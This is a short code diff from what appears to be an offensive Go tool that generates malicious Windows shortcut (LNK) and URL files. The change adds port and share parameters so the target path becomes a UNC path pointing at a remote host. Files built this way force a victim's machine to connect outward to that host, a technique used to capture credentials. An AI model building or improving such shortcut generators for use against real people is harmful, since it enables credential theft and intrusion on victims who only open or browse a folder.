@@ -13,8 +13,11 @@ import (
 )
 
 // CreateLNK function
-func CreateLNK(target string, output string, description string) {
+func CreateLNK(target string, output string, description string, port string, share string) {
 	fmt.Printf("[+] Preparing your malicious LNK file...\n\n")
+
+	// Set the target path
+	target = "\\\\" + target + "@" + port + "\\" + share
 
 	// Record the start time
 	LNKCreationStartTime := time.Now()
@@ -66,8 +69,11 @@ func CreateLNK(target string, output string, description string) {
 }
 
 // CreateURL function
-func CreateURL(target string, output string, url string, workingDir string) {
+func CreateURL(target string, output string, url string, workingDir string, port string) {
 	fmt.Printf("[+] Preparing your malicious URL file...\n\n")
+
+	// Set the target path
+	target = target + "@" + port
 
 	// Record the start time
 	URLCreationStartTime := time.Now()
